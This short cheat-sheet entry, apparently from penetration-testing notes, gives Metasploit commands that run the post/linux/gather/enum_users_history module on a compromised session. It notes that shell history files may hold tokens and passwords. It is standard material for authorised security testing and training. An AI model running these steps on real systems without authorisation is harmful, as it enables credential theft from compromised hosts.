#### Post Exploitation Metasploit Modules
> Enumerate users history . Sometime there may be tokens, password for various services in the history file.
```
background
use post/linux/gather/enum_users_history
set SESSION 1
run

``
